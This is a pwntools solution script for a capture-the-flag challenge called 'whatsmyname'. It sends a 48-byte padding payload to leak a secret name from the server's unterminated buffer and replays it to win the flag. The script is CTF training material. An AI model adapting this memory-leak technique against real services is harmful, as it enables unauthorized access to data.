#!/usr/local/bin/python3

from difflib import context_diff
from pwn import *

# choose the remote or local connection
if sys.argv[1] == "remote":
    r = remote("challs.actf.co", 31223)
else:
    r = process("./whatsmyname")

context.log_level = 'debug'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']

payload = b'A' * 48
r.recvuntil(b"Hi! What's your name? ")
r.send(payload)

r.recvuntil(b"Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
myname = r.recvline().ljust(48)
assert b'\x20' not in myname
assert b'\x00' not in myname

myname = myname[:-2] + b'\x00'
print("[*] myname: ",myname, len(myname))

r.recvuntil(b"Guess my name and you'll get a flag!")
# gdb attach
# gdb.attach(r, '''
#     b main
#     ''')
pause()
r.send(myname)

r.interactive()
# 看运气，脸黑得多试几次